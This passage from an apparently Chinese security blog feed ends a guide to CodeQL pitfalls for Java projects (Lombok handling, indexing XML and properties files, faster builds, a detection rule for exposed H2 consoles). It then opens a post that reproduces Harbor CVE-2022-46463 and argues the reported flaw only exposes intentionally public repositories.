f.write(line.replace(&#x27;src/main/java&#x27;, &#x27;src/main/lombok&#x27;))</span></span><br><span class="line">line = line.replace(<span class="string">&quot;&lt;directory&gt;$&#123;project.basedir&#125;/src/main&lt;/directory&gt;&quot;</span>,</span><br><span class="line"><span class="string">&quot;&lt;directory&gt;$&#123;project.basedir&#125;/src/main/lombok&lt;/directory&gt;&quot;</span>)</span><br><span class="line">line = line.replace(<span class="string">&#x27;src/main/java&#x27;</span>, <span class="string">&#x27;src/main/lombok&#x27;</span>)</span><br><span class="line">f.write(line)</span><br><span class="line"></span><br><span class="line">tree = ET.ElementTree()</span><br><span class="line"><span class="comment"># 去掉ns0标签</span></span><br><span class="line">XML_NS_NAME = <span class="string">&quot;&quot;</span></span><br><span class="line">XML_NS_VALUE = <span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span><br><span class="line">ET.register_namespace(XML_NS_NAME, XML_NS_VALUE)</span><br><span class="line">tree.parse(file)</span><br><span class="line">root = tree.getroot()</span><br><span class="line">pre = (re.split(<span class="string">&#x27;project&#x27;</span>, root.tag))[<span class="number">0</span>]</span><br><span class="line"><span class="comment"># 生成元素</span></span><br><span class="line">sourceDirectory = ET.Element(<span class="string">&quot;sourceDirectory&quot;</span>)</span><br><span class="line">goal = ET.Element(<span class="string">&quot;goal&quot;</span>)</span><br><span class="line">phase = ET.Element(<span class="string">&quot;phase&quot;</span>)</span><br><span class="line">groupId = ET.Element(<span class="string">&quot;groupId&quot;</span>)</span><br><span class="line">artifactId = ET.Element(<span class="string">&quot;artifactId&quot;</span>)</span><br><span class="line">version = ET.Element(<span class="string">&quot;version&quot;</span>)</span><br><span class="line"><span class="comment"># 赋值</span></span><br><span class="line">sourceDirectory.text = <span class="string">&quot;$&#123;project.basedir&#125;/src/main/lombok&quot;</span></span><br><span class="line">goal.text = <span class="string">&quot;delombok&quot;</span></span><br><span class="line">phase.text = <span class="string">&quot;generate-sources&quot;</span></span><br><span class="line">groupId.text = <span class="string">&quot;org.projectlombok&quot;</span></span><br><span class="line">artifactId.text = <span class="string">&quot;lombok-maven-plugin&quot;</span></span><br><span class="line">version.text = <span class="string">&quot;1.18.4.0&quot;</span></span><br><span class="line"><span class="comment"># 打包</span></span><br><span class="line">goals = ET.Element(<span class="string">&quot;goals&quot;</span>)</span><br><span class="line">goals.append(goal)</span><br><span class="line">addOutputDirectory = ET.Element(<span class="string">&quot;addOutputDirectory&quot;</span>)</span><br><span class="line">addOutputDirectory.text = <span class="string">&quot;false&quot;</span></span><br><span class="line">sourceDirectory2 = ET.Element(<span class="string">&quot;sourceDirectory&quot;</span>)</span><br><span class="line">sourceDirectory2.text = <span class="string">&quot;src/main/java&quot;</span></span><br><span class="line">outputDirectory = ET.Element(<span class="string">&quot;outputDirectory&quot;</span>)</span><br><span class="line">outputDirectory.text = <span class="string">&quot;$&#123;project.basedir&#125;/src/main/lombok&quot;</span></span><br><span class="line">encoding = ET.Element(<span class="string">&quot;encoding&quot;</span>)</span><br><span class="line">encoding.text = <span class="string">&quot;UTF-8&quot;</span></span><br><span class="line">configuration = ET.Element(<span class="string">&quot;configuration&quot;</span>)</span><br><span class="line">configuration.append(encoding)</span><br><span class="line">configuration.append(addOutputDirectory)</span><br><span class="line">configuration.append(sourceDirectory2)</span><br><span class="line">configuration.append(outputDirectory)</span><br><span class="line">execution = ET.Element(<span class="string">&quot;execution&quot;</span>)</span><br><span class="line">execution.append(phase)</span><br><span class="line">execution.append(goals)</span><br><span class="line">execution.append(configuration)</span><br><span class="line">executions = ET.Element(<span class="string">&quot;executions&quot;</span>)</span><br><span class="line">executions.append(execution)</span><br><span class="line">plugin = ET.Element(<span class="string">&quot;plugin&quot;</span>)</span><br><span class="line">plugin.append(groupId)</span><br><span class="line">plugin.append(artifactId)</span><br><span class="line">plugin.append(version)</span><br><span class="line">plugin.append(executions)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 多条件判断</span></span><br><span class="line">build = root.find(pre + <span class="string">&quot;build&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> build <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">build = ET.Element(<span class="string">&quot;build&quot;</span>)</span><br><span class="line">root.append(build)</span><br><span class="line">build.insert(<span class="number">0</span>, sourceDirectory)</span><br><span class="line">plugins = build.find(pre + <span class="string">&quot;plugins&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> plugins <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">plugins = ET.Element(<span class="string">&quot;plugins&quot;</span>)</span><br><span class="line">build.insert(<span class="number">0</span>, plugins)</span><br><span class="line">plugins.insert(<span class="number">0</span>, plugin)</span><br><span class="line"><span class="comment"># 写入</span></span><br><span class="line">tree.write(file, encoding=<span class="string">&quot;utf-8&quot;</span>, xml_declaration=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">relombok</span>(<span class="params">file</span>):</span><br><span class="line"><span class="comment">#删除自带的Lombok插件</span></span><br><span class="line">tree = ET.ElementTree()</span><br><span class="line"><span class="comment"># 去掉ns0标签</span></span><br><span class="line">XML_NS_NAME = <span class="string">&quot;&quot;</span></span><br><span class="line">XML_NS_VALUE = <span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span><br><span class="line">ET.register_namespace(XML_NS_NAME, XML_NS_VALUE)</span><br><span class="line">tree.parse(file)</span><br><span class="line">root = tree.getroot()</span><br><span class="line">pre = (re.split(<span class="string">&#x27;project&#x27;</span>, root.tag))[<span class="number">0</span>]</span><br><span class="line">build = root.find(pre + <span class="string">&quot;build&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> build <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">plugins = build.find(pre + <span class="string">&quot;plugins&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> plugins <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> <span class="built_in">len</span>(plugins)==<span class="number">0</span>:</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line"><span class="keyword">for</span> plugin <span class="keyword">in</span> plugins:</span><br><span class="line"><span class="keyword">for</span> child <span class="keyword">in</span> plugin:</span><br><span class="line"><span class="keyword">if</span> child.text == <span class="string">&quot;lombok-maven-plugin&quot;</span>:</span><br><span class="line">plugins.remove(plugin)</span><br><span class="line"><span class="comment"># 写入</span></span><br><span class="line">tree.write(file, encoding=<span class="string">&quot;utf-8&quot;</span>, xml_declaration=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    file = sys.argv[<span class="number">1</span>]</span><br><span class="line">    delbankline(file)</span><br><span class="line">    relombok(file)</span><br><span class="line">    delombok(file)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;finish!!&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="坑II-扩展文件">坑II - 扩展文件</h2><h3 id="场景-2">场景</h3><p>在看官方提供的ql规则时候，有一个特殊的规则引起了注意：<a href="https://github.com/github/codeql/blob/main/java/ql/src/experimental/Security/CWE/CWE-089/MyBatisMapperXmlSqlInjection.ql">MyBatisMapperXmlSqlInjection.ql</a></p><p>他做的事情是扫描Mapper配置Mybatis XML的${}的SQL注入，但是在我们的源代码中，完全没有看到相关的Mybatis的Mapper XML文件。所以规则扫描一直无效。</p><h3 id="原因-2">原因</h3><p>原因归结于我们没有把对应的xml文件加入到我们的数据库中，在默认的配置中，codeql仅加载了四种xml文件，分别为：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AndroidManifest.xml</span><br><span class="line">pom.xml</span><br><span class="line">struts.xml</span><br><span class="line">web.xml</span><br></pre></td></tr></table></figure><h3 id="解决方案-2">解决方案</h3><p>结局方案主要有两种方式。<br><strong>1.拆分<code>codeql database create</code></strong><br>这种方式是在官方的Github Issue 发现的，将codeql database create拆分为几个步骤，并在中间的过程增加配置。</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">codeql database init --source-root &lt;YourSourcePath&gt; --language java &lt;YourDBPath&gt;</span><br><span class="line">codeql database trace-command --working-dir=&lt;YourSourcePath&gt; &lt;YourDBPath&gt; &lt;BuildCommand&gt;</span><br><span class="line">codeql database index-files --language properties --include-extension .properties --working-dir=&lt;YourSourcePath&gt; --exclude=target &lt;YourDBPath&gt;</span><br><span class="line">codeql database index-files --language xml --include-extension .xml --working-dir=&lt;YourSourcePath&gt; --exclude=target &lt;YourDBPath&gt;</span><br><span class="line">codeql database finalize &lt;YourDBPath&gt;</span><br></pre></td></tr></table></figure><p><strong>2.修改<code>pre-finalize</code></strong><br>这里参考了<a href="https://mp.weixin.qq.com/s/egjA2xFm_ziGHjJ7IxOCbg">楼兰师傅的文章</a>学到了一种新的方式。<br>上面这种方法在日常的使用中很麻烦，每次构建分析前还得运行脚本来构建。因此这种方法与方法1对比，提升了很大的便捷性。</p><p>这种方法只提供xml文件的扩展，如果需要扩展其他类型文件，还需要自己手动增加。(因为 --language 参数不同）</p><p><strong>windows:</strong><br>在codeql-cli/java/tools/pre-finalize.cmd插入<code>--include &quot;**/resources/**/*.xml&quot; ^ </code><br><img src="media/16479343916145.jpg" alt=""></p><p><strong>linux:</strong><br>在codeql-cli/java/tools/pre-finalize.sh插入<code>--include &quot;**/resources/**/*.xml&quot;</code><br><img src="media/16479342964394.jpg" alt=""></p><p><strong>加入properties扩展：</strong><br>linux为例：<br>在codeql-cli/java/tools/pre-finalize.sh的结尾找到：<code>if [ &quot;$&#123;LGTM_INDEX_PROPERTIES_FILES:-false&#125;&quot; == &quot;true&quot; ]</code><br>删除掉这个if判断，即可默认加载properties。</p><p>注意，这种方法都加入了size-limit的限制，.xml默认限制10MB，.properties默认限制5MB。</p><h2 id="坑III-分析缓慢">坑III - 分析缓慢</h2><h3 id="场景-3">场景</h3><p>在一些巨型项目中，一次构建+分析可能需要花费10-15分钟，如果在构建的过程中发现忘记加载某些文件，这个过程就要再来一次，重复几次，一天的时间就无了。</p><h3 id="原因-3">原因</h3><p>大型的项目构建速度缓慢，规则分析也很缓慢。</p><h3 id="解决方案-3">解决方案</h3><p><strong>使用mvnd 来代替mvn提速</strong><br>因为我测试的项目大部分使用mvn管理，而在codeql中，mvn默认的构建命令为：<br><code>mvn clean package -f &quot;pom.xml&quot; -B -V -e -Dfindbugs.skip -Dcheckstyle.skip -Dpmd.skip=true -Denforcer.skip -Dmaven.javadoc.skip -DskipTests -Dmaven.test.skip.exec -Dlicense.skip=true -Drat.skip=true </code></p><p>首先下载并安装<a href="https://github.com/apache/maven-mvnd">mvnd</a>, 官方的手册已经比较清晰。</p><p>然后修改codeql构建命令，并使用mvnd进行构建<br><code>codeql database create codeqlDB --language=java --command=&quot;mvnd clean package -f &quot;pom.xml&quot; -B -V -e -Dfindbugs.skip -Dcheckstyle.skip -Dpmd.skip=true -Denforcer.skip -Dmaven.javadoc.skip -DskipTests -Dmaven.test.skip.exec -Dlicense.skip=true -Drat.skip=true</code></p><p>如果mvnd没有配置的话，还需要使用<code>-s settings.xml</code>指定mvn的setting配置文件。</p><p>大概优化的时间在20-30s左右，不同的项目优化效果不同。</p><p><strong>规则分析参数调优</strong><br>对于经常需要用到的规则，codeql支持生成qlo的缓存文件，这样下次再分析其他数据库时，就不需要再次compile而是直接进入规则分析了。<br><code>codeql query compile --warnings=hide --fast-compilation --dump-qlo</code><br>对应目录下会生成规则同名的qlo文件。这样在下次分析这个ql时，codeql会自动找到这个qlo作为缓存，加快了compile的过程。</p><h2 id="优化I-python库">优化I - python库</h2><h3 id="场景-4">场景</h3><p>在经历上述坑点之后，我的数据库构建已经成为了一个很复杂的过程。经常需要各种脚本来辅助。脚本的代码就会出现很丑陋的:<code>os.system(&quot;codeql database xxxxxx ......&quot;)</code>, 令人难以忍受。</p><h3 id="解决方案-4">解决方案</h3><p>偶然在Github发现了一个非官方的<a href="https://github.com/AlexAltea/codeql-python">python-codeql库</a>, 封装了大量常用的codeql操作。<br>安装：<br><code>pip3 install git+https://github.com/AlexAltea/codeql-python.git</code><br>使用：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> codeql</span><br><span class="line"></span><br><span class="line"><span class="comment"># Open databases from files or folders</span></span><br><span class="line">db = codeql.Database(<span class="string">&#x27;path/to/db.zip&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Queries return a CSV-like array of arrays</span></span><br><span class="line">results = db.query(<span class="string">&#x27;select &quot;Hello&quot;&#x27;</span>)</span><br><span class="line"><span class="keyword">assert</span>(results[<span class="number">0</span>][<span class="number">1</span>] == <span class="string">&#x27;Hello&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Queries with external libraries are supported as well</span></span><br><span class="line">codeql.set_search_path(<span class="string">&#x27;path/to/codeql&#x27;</span>)</span><br><span class="line">results = db.query(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    import cpp</span></span><br><span class="line"><span class="string">    from BlockStmt block    </span></span><br><span class="line"><span class="string">    select block</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Create temporary databases from inlined sources</span></span><br><span class="line">db = codeql.Database.from_cpp(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    int main() &#123;</span></span><br><span class="line"><span class="string">        return 1337 + 1337 + 1337;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">results = db.query(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    import cpp</span></span><br><span class="line"><span class="string">    from Literal literal where</span></span><br><span class="line"><span class="string">        literal.getType() instanceof IntType and</span></span><br><span class="line"><span class="string">        literal.getValue().toInt() = 1337</span></span><br><span class="line"><span class="string">    select literal</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"><span class="keyword">assert</span>(<span class="built_in">len</span>(results[<span class="number">1</span>:]) == <span class="number">3</span>)</span><br></pre></td></tr></table></figure><h2 id="优化II-部分规则Demo">优化II - 部分规则Demo</h2><p>有了坑II的支持，现在已经可以扫描如spring boot内的配置文件了。例如H2-Console的JNDI注入。</p><p>在这个规则中，检测了两个事情：</p><ol><li>是否存在com.h2database.h2这个jar.</li><li>是否开启了spring.h2.console.enabled</li></ol><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">import java</span><br><span class="line">import semmle.code.configfiles.ConfigFiles</span><br><span class="line">import semmle.code.xml.MavenPom</span><br><span class="line"></span><br><span class="line">private class H2databaseDependency extends Dependency &#123;</span><br><span class="line">  H2databaseDependency() &#123;</span><br><span class="line">    this.getAChild(&quot;groupId&quot;).getTextValue() <span class="operator">=</span> &quot;com.h2database&quot; <span class="keyword">and</span></span><br><span class="line">    this.getAChild(&quot;artifactId&quot;).getTextValue() <span class="operator">=</span> &quot;h2&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class ApplicationProperties extends ConfigPair &#123;</span><br><span class="line">  ApplicationProperties() &#123; this.getFile().getBaseName() <span class="operator">=</span> &quot;application.properties&quot; &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> H2databaseDependency dependency, ApplicationProperties ap</span><br><span class="line"><span class="keyword">where</span></span><br><span class="line">  ap.getFile()</span><br><span class="line">      .getParentContainer()</span><br><span class="line">      .getAbsolutePath()</span><br><span class="line">      .<span class="keyword">matches</span>(dependency.getFile().getParentContainer().getAbsolutePath() <span class="operator">+</span> &quot;%&quot;) <span class="keyword">and</span></span><br><span class="line">  <span class="keyword">exists</span>( <span class="operator">|</span></span><br><span class="line">    ap.getNameElement().getName() <span class="operator">=</span> &quot;spring.h2.console.enabled&quot; <span class="keyword">and</span></span><br><span class="line">    ap.getValueElement().getValue() <span class="operator">=</span> &quot;true&quot;</span><br><span class="line">  ) <span class="keyword">and</span></span><br><span class="line">  <span class="keyword">not</span> ap.getFile().getAbsolutePath().<span class="keyword">matches</span>(&quot;%test/resources%&quot;)</span><br><span class="line"><span class="keyword">select</span> ap, &quot;该配置存在H2 Database JNDI注入漏洞&quot;</span><br></pre></td></tr></table></figure><p>这里只是抛砖引玉，有了配置文件，可以快速的对比SCA，来检查是否使用了存在漏洞的三方jar包。</p><h2 id="结尾">结尾</h2><p>暂时想到的就这些，还有一些从网络上学到的一些小东西就不丢人现眼了...如果有错误或其他的一些小tips，恳求各位师傅指点一二🙇。</p><h4 id="参考链接">参考链接</h4><blockquote><p>0.Github Issue : <a href="https://github.com/github/codeql/issues/8363">https://github.com/github/codeql/issues/8363</a><br>1.Github Issue : <a href="https://github.com/github/codeql/issues/4984#:~:text=Unfortunately%20Lombok%20does%20not%20work%20with%20the%20CodeQL,the%20source%20files%20before%20running%20CodeQL%20as%20follows%3A">https://github.com/github/codeql/issues/4984#:~:text=Unfortunately Lombok does not work with the CodeQL,the source files before running CodeQL as follows%3A</a><br>2.MyBatisMapperXmlSqlInjection.ql : <a href="https://github.com/github/codeql/blob/main/java/ql/src/experimental/Security/CWE/CWE-089/MyBatisMapperXmlSqlInjection.ql">https://github.com/github/codeql/blob/main/java/ql/src/experimental/Security/CWE/CWE-089/MyBatisMapperXmlSqlInjection.ql</a><br>3.楼兰师傅的文章 : <a href="https://mp.weixin.qq.com/s/egjA2xFm_ziGHjJ7IxOCbg">https://mp.weixin.qq.com/s/egjA2xFm_ziGHjJ7IxOCbg</a><br>4.mvnd : <a href="https://github.com/apache/maven-mvnd">https://github.com/apache/maven-mvnd</a><br>5.python-codeql库 : <a href="https://github.com/AlexAltea/codeql-python">https://github.com/AlexAltea/codeql-python</a></p></blockquote>]]></content>
    
    
    <summary type="html">&lt;h1&gt;CodeQL 踩坑指南 - Java&lt;/h1&gt;
&lt;!-- split --&gt;
&lt;p&gt;讲解这东西的大师傅们太多了，不班门弄斧了，这里仅针对一些踩过的坑点提供一些自己的解决方案，希望能对一些师傅提供点帮助。&lt;/p&gt;</summary>
    
    
    
    <category term="Coding" scheme="http://blog.dvkunion.cn/categories/Coding/"/>
    
    
    <category term="WEB" scheme="http://blog.dvkunion.cn/tags/WEB/"/>
    
    <category term="代码审计" scheme="http://blog.dvkunion.cn/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>Harbor 未授权漏洞的背后是魔幻的荒诞主义</title>
    <link href="http://blog.dvkunion.cn/2022/01/19/Harbor%20%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E%E7%9A%84%E8%83%8C%E5%90%8E%E6%98%AF%E9%AD%94%E5%B9%BB%E7%9A%84%E8%8D%92%E8%AF%9E%E4%B8%BB%E4%B9%89/"/>
    <id>http://blog.dvkunion.cn/2022/01/19/Harbor%20%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E%E7%9A%84%E8%83%8C%E5%90%8E%E6%98%AF%E9%AD%94%E5%B9%BB%E7%9A%84%E8%8D%92%E8%AF%9E%E4%B8%BB%E4%B9%89/</id>
    <published>2022-01-19T13:12:11.000Z</published>
    <updated>2023-11-03T21:25:20.032Z</updated>
    
    <content type="html"><![CDATA[<h1>Harbor 未授权漏洞的背后是魔幻的荒诞主义</h1><h2 id="前言">前言</h2><p>怎么说呢，心里五味杂陈，面对在大年前横空而来的 <code>CVE-2022-46463</code>，以及一通测试复现后，面对着电脑屏幕久久说不出话来，于是便有了这篇文章。突然感觉安全已经进入到了一个魔幻的荒诞主义：我们还有什么可信的东西？</p><p>大家可以当作一篇小说看看吧。</p><h2 id="事情经过">事情经过</h2><p>事情要从我的一个安全朋友说起。</p><h3 id="起因">起因</h3><p>1.16日，天高气爽，想着还有两天就要放假回家过年的心，根本无法集中在工作中，于是在摸鱼冲浪的时候，突然发现了一篇紧急通告，</p><blockquote><p>CVE-2022-46463 漏洞预警</p></blockquote><p>很快啊，赶紧点进去一看，发现是一个名为<code>harbor</code>的未授权漏洞，<strong>私有</strong> 和 <strong>公开</strong> 仓库镜像可以被未授权获取，可能导致敏感信息泄漏。</p><p>一打眼看到的漏洞评级 <code>严重</code> 吓了一激灵，并且显示<code>POC</code>已经在野利用了？还两天过年了，要是这么严重的问题，还怎么安心回家过这个团圆？</p><p>由此，开启了一段魔幻的 &quot;漏洞&quot; 修复过程。</p><h3 id="追踪">追踪</h3><p>根据互联网的信息，发现各平台预警，除<code>CVE</code>外，所有链接均指向了一个 <code>github</code> 仓库，</p><blockquote><p><a href="https://github.com/lanqingaa/123">https://github.com/lanqingaa/123</a></p></blockquote><p>在这个<code>github</code>仓库里，标记的很清楚的复现步骤啊：通过登录页面的搜索接口，可以搜索到显示为 <code>私有</code> 项目的仓库。</p><p>这还是挺吓人的，利用方式简单、影响严重，可能会导致公司几千个私有镜像被他人获取，后果不堪设想。</p><p>按照cve给出的影响范围：</p><blockquote><p>1.x &lt;= Harbor &lt;= 2.5.3</p></blockquote><p>很不幸，自家的harbor正好在范围内，看来年前又要找运维大哥去帮忙修复了。</p><h3 id="坎坷的复现">坎坷的复现</h3><p>去找运维大哥帮忙，作为安全人员，肯定先要自己搞明白了再去摇人，于是就拿着公司的harbor尝试了一下，发现好像有点不对劲： 不论我怎么搜索，从 <code>a-z</code>都只能显示<strong>公开</strong>仓库的数据，并无漏洞所描述的 <strong>私有</strong>仓库数据。</p><p>会不会是复现的步骤有问题？又重新读了一遍整体的逻辑，会不会是我们公司的仓库就没有 <strong>私有</strong> 属性的呢？</p><p>赶紧去和运维大哥确认了一下，发现的确存在 <strong>私有</strong> 镜像，可为什么这个漏洞却搜不到呢？</p><p>怀着窘迫的心在<code>harbor</code> 官方仓库不断寻找，发现，好像官方也没对这个漏洞进行相关 <code>fix</code>的提交记录哎，那预警里面的 <code>请升级到最新版本</code> 是如何得出的呢？</p><p>一定是自己功夫还不够深，一定是自己的姿势还不太对，此时的菜鸡的安全人员还没有意识到问题的严重性和魔幻性，依旧还在自身寻找问题。</p><h3 id="反转">反转</h3><p>1.17日，复现一天无果的安全人员，气急败坏只能继续摸鱼，然后发现了另一篇通告：</p><blockquote><p>关于Habor CVE-2022-46463的说明</p></blockquote><p>文章大概就是经过测试，所有版本都没有搜索到私有仓库；同时还分析了<code>search</code> api 的认证逻辑。官方手册指出 公开仓库 能够被搜索到，属于产品特性。这个CVE甚至称不上是漏洞。</p><p>事情开始变得魔幻起来了。</p><h3 id="未完待续">未完待续</h3><p>从事情开始出现反转后，便开始出现了各路声音：有人为这个漏洞就不该出现CVE的；有认为Harbor设计不合理的，就因该算Harbor的漏洞；有认为Harbor应该修改默认选项来避免出现滥用的不安全配置的，等等等等。</p><p>截止至发文今日，搜索该CVE编号，依旧能够发现大量的&quot;安全公告&quot;,无一例外都是相同的漏洞描述，相同的影响范围，相同的修复建议。</p><p>我们仍未知道那天所看见的cve的名字。</p><h2 id="来关注漏洞">来关注漏洞</h2><p>故事讲完了，我们来实际关注下漏洞。</p><p>根据 <code>https://github.com/lanqingaa/123</code> 所描述的<code>poc</code>, <code>harbor</code> v1 v2版本均存在该问题，但是自己观察会发现，该作者在v1的截图中的确搜到了显示为 <code>private</code> 的仓库：<br><img src="/img/16740212582611.jpg" alt=""></p><p>但是在 v2 的版本中，他给出的结果却是 <code>public</code> 仓库。<br><img src="/img/16740213120010.jpg" alt=""></p><p>再回看漏洞描述：</p><blockquote><p>Harbor 中存在访问控制错误问题，允许攻击者无需身份验证即可访问公共和私有镜像存储库的所有信息，并拉取镜像。</p></blockquote><h3 id="理清逻辑">理清逻辑</h3><p>首先要明确一下几个点：</p><ul><li>第一，私有化仓库到底能不能像漏洞所描述的那样，被搜索发现？</li><li>第二，仅能访问到公开仓库，是否还能被称之为漏洞？</li></ul><p>如果第一点成立，那么 <code>CVE-2022-46463</code> 无疑是一个高危漏洞，未认证户通过该漏洞可以获取到了认证用户的权限，明显的越权问题。</p><p>如果第一点不成立，也就是该接口只能获取到公开仓库的情景下，问题自然而然的来到了第二点：如果仅能够访问到公开仓库的信息，是否还存在风险呢？</p><p>在讨论第二点的同时，我们还需要预先讨论一个问题：</p><ul><li>公开仓库的概念到底是面向所有认证用户还是所有用户？</li></ul><p>带着这几个问题，我们亲自去复现一波这个魔幻的 <code>CVE-2022-46463</code></p><h3 id="复现">复现</h3><h4 id="v2">v2</h4><p>因为目前harbor的release多数为v2, 就先使用v2的版本进行了复现：</p><p>首先我们用权限账户登陆，可以看到仓库存在 private/public两种项目。<br><img src="/img/16740218044242.jpg" alt=""></p><p>其中，私有的library内存在如下镜像。</p><p><img src="/img/16740218419115.jpg" alt=""></p><p>我们退出账户，尝试去搜索：<br><img src="/img/16740218684380.jpg" alt=""></p><p>毫无结果，再尝试搜索一下公开镜像：<br><img src="/img/16740218947330.jpg" alt=""><br>确实获取到了列表信息。<br><img src="/img/16740219359533.jpg" alt=""></p><p>总结: v2仅能够搜索到公开镜像。</p><h4 id="v1">v1</h4><p>在测试无果的情况下，想到：会不会是v1和v2的版本存在差异呢？</p><p>于是我们来尝试，使用和<code>https://github.com/lanqingaa/123</code> 作者完全一致版本的v1进行尝试：<br><img src="/img/16740185412406.jpg" alt=""></p><p>与v2相同，我们先创建私有的仓库，然后上传测试镜像：</p><p><img src="/img/16740220897858.jpg" alt=""><br><img src="/img/16740221142173.jpg" alt=""><br>然后退出登录，尝试搜索私有仓库：<br><img src="/img/16740185766211.jpg" alt=""><br>无果，再尝试搜索下公开的 <code>library</code> 仓库<br><img src="/img/16740221399539.jpg" alt=""><br>？？？ 的确出现了私有仓库，但是仔细看？是在管理面板内为<code>public</code>权限的<code>library</code><br><img src="/img/16740221754902.jpg" alt=""><br>为了更有效的说明这个事情，我们再创建个公开仓库：<br><img src="/img/16740222082857.jpg" alt=""><br>然后退出登录，再次搜索：<br><img src="/img/16740222537273.jpg" alt=""><br>结果两个公开仓库都被搜索出来了，而且还标注着<code>private</code></p><p>.......看到这里的各位，应该能猜测这是一个什么问题了。</p><h2 id="个人观点">个人观点</h2><p>经过复现，我想大家也知道这个 <code>CVE-2022-46463</code> 到底是个如何的漏洞了：通过该接口，能够搜索到所有的公开仓库。</p><p>对于第一点，已经没有讨论的必要了，问题来到第二点：仅能搜索到公开仓库，到底还是不是一个漏洞。</p><p>在判断是否是个漏洞之前，需要先达成两点共识：</p><ul><li>public 镜像，到底是面对所有用户，还是所有的认证用户。</li><li>到底什么才叫做漏洞</li></ul><p>个人认为，harbor很明显的认为 public 镜像是针对所有用户。可以从官方的手册上搜索到public 的概念，也可以类比 dockerhub 私有镜像和公开镜像的概念。因此我个人认为，public 的定义并无任何问题。</p><p>而至于：什么是漏洞，我想引介《我的安全世界观》中的观点：</p><blockquote><p>程序的目的是为了实现业务功能<br>程序的实现可能额外实现了些其他的功能<br>这些其他的功能影响到安全，就可以被称漏洞。<br>其中，影响安全才是定义的关键。</p></blockquote><p>来看这个api的设计，harbor的定位就是想要搜索到所有的 public 镜像，程序完美的实现了目的，且没有搜索到额外的private镜像。 程序没有做超出业务功能的事情；同时在官方的手册里，清晰明了的定义着什么是<code>public</code>权限。</p><p>除此外，我们再来看影响：搜索到公开仓库，会对企业带来什么样的影响，有怎样的安全隐患。</p><p>在该漏洞所描述中，公开仓库可能会“导致信息泄露”，获取到镜像信息。</p><p>我们知道，镜像其实就是一个打包好的分层的文件系统。那么对于获取到这个文件系统的人来说，他可以获取到这个镜像内部的任何信息。</p><p>如果说是由于harbor 的原因导致的这部分信息泄漏，那么即使是公开的镜像，harbor 也应该为这个事情负责。而事实是，任何获取到这个文件系统的人，都能够获取到harbor 所展示出的这部分信息。 这样来讲，harbor只是个搬运工而已，仅仅展示了一些任何人都能够读到的数据而已。导致信息泄露的，应该是归属于 <strong>“镜像安全”</strong> 的范畴。</p><p>因此，我们应该把漏洞中所描述的“敏感信息泄漏”，视作是镜像安全问题，而并非harbor 应用本身。漏洞的原因是在于镜像夹杂了不应该被打包进去的数据。该问题并不关心你是用的是harbor 仓库还是portus 仓库，还是dockerhub 仓库，他就是这个镜像本身携带的问题。</p><p>唯一能被视为漏洞影响点的，就是在于，用户如果想获取有哪些镜像的这个信息，原本只能够通过猜测或已知的镜像名称，通过pull 的方式获取到镜像本身。在未知镜像名的条件下是比较困难批量获取到更多信息的，只能尝试暴力猜解。而公开仓库搜索提供了这样一个便利的入口来展示当前能获取的镜像列表，对攻击者提供了帮助。</p><p>这样，问题又回到了第二个点。public 仓库面向所有用户而非认证用户，是否存在问题。</p><p>当业务功能存在部分风险时，那么应该告知并警惕用户使用的方式，正确使用该功能。我们来看下harbor是如何做的：<br><img src="/img/16740177839330.jpg" alt=""><br><img src="/img/16740178868992.jpg" alt=""><br>在项目创建页面，harbor清楚的描述着 什么叫做public仓库，告知了： &quot;无需login即可docker pull&quot;。同时，公开仓库还是一个非默认选项，默认创建的仓库都是私有的。我实在想不出还有什么别的方式能够来&quot;帮助&quot; 用户 建设意识上的安全问题。</p><p>就好比 php exec函数，你不能说exec可能会执行恶意命令，就直接说php存在漏洞，而直接不允许了业务使用该函数。exec本身并不是漏洞，但当你使用的方式不正确时，的确会造成一定的安全风险。这个比喻模型同样可以适用于 <code>CVE-2022-46463</code>。</p><h2 id="综合评估">综合评估</h2><p>最终，我们为这个&quot;漏洞&quot;（如果非要说是的话，毕竟有了CVE编号）做一个客观的评估。</p><h3 id="漏洞描述">漏洞描述</h3><p>Harbor api search 允许未认证的用户搜索仓库内存在的 